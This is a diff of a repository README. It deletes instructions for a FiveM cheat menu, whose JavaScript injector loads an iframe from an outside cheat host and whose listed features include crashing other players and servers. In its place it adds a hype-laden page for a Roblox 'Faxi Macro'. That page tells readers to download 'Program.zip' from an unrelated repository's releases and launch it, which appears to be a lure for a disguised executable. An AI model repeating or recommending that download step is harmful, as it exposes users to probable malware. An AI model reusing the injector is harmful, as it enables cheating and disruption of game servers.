@@ -1,30 +1,48 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
+# 🚀 Welcome to the Faxi-Macro Repository! 🤖
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+## Repository: Faxi-Macro
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+![Faxi-Macro](https://example.com/faxi-macro-image.jpg)
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+### Description:
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+Are you ready to enhance your anime Adventures experience with the powerful Faxi Macro? This repository provides you with all the information you need to get and set up the Faxi Macro in Anime Adventures on Roblox. Say goodbye to manual tasks and embrace the efficiency and automation that Faxi Macro brings to your gameplay!
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+### Topics:
+
+⚙️ roblox-faxi-ma  
+⚙️ faxi-ma  
+⚙️ faxi-macro-discord  
+⚙️ faxi-macro-anime-adventures  
+⚙️ faxi-macro-safe  
+⚙️ faxi-macro-github  
+
+### Installation:
+
+To get started with Faxi Macro, download the program from the link below:
+
+[![Download Faxi Macro](https://img.shields.io/badge/Download-Faxi_Macro-9cf)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+
+📂 **Note:** The downloaded file needs to be launched in order to set up the Faxi Macro successfully.
+
+### Getting Started:
+
+Follow these steps to unleash the power of Faxi Macro in Anime Adventures:
+
+1. Download the Faxi Macro program from the provided link.
+2. Launch the downloaded file to initiate the setup process.
+3. Follow the on-screen instructions to configure the Faxi Macro to suit your gameplay preferences.
+4. Enjoy automated tasks and increased efficiency in your Anime Adventures gameplay!
+
+### Additional Resources:
+
+- Explore the [Faxi-Macro-Discord](https://discord.com/faxi-macro-discord) channel for community support and updates.
+- Visit the [Faxi-Macro-Github](https://github.com/faxi-macro-github) page for the latest releases and documentation.
+
+### Support:
+
+For any inquiries or assistance regarding the Faxi Macro, feel free to reach out to the Faxi-Macro-Discord community or the GitHub repository. Our team of experts is ready to help you optimize your Anime Adventures experience with Faxi Macro.
+
+### Start Your Faxi Macro Journey Now! 🎮
+
+🌟 Happy Gaming! 🌟
